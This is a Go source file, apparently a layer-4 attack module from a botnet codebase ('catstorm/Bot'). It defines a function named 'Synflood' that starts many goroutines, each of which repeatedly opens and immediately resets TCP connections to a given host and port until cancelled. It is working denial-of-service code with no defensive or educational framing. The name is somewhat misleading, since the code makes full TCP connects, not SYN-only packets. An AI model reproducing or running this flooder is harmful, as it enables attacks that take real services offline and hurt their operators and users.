package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func Synflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()

	for w := 0; w < workers; w++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				c, e := net.DialTimeout("tcp", addr, 3*time.Second)
				if e == nil {
					if tcp, ok := c.(*net.TCPConn); ok {
						tcp.SetLinger(0)
					}
					c.Close()
				} else {
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}
	<-ctx.Done()
}
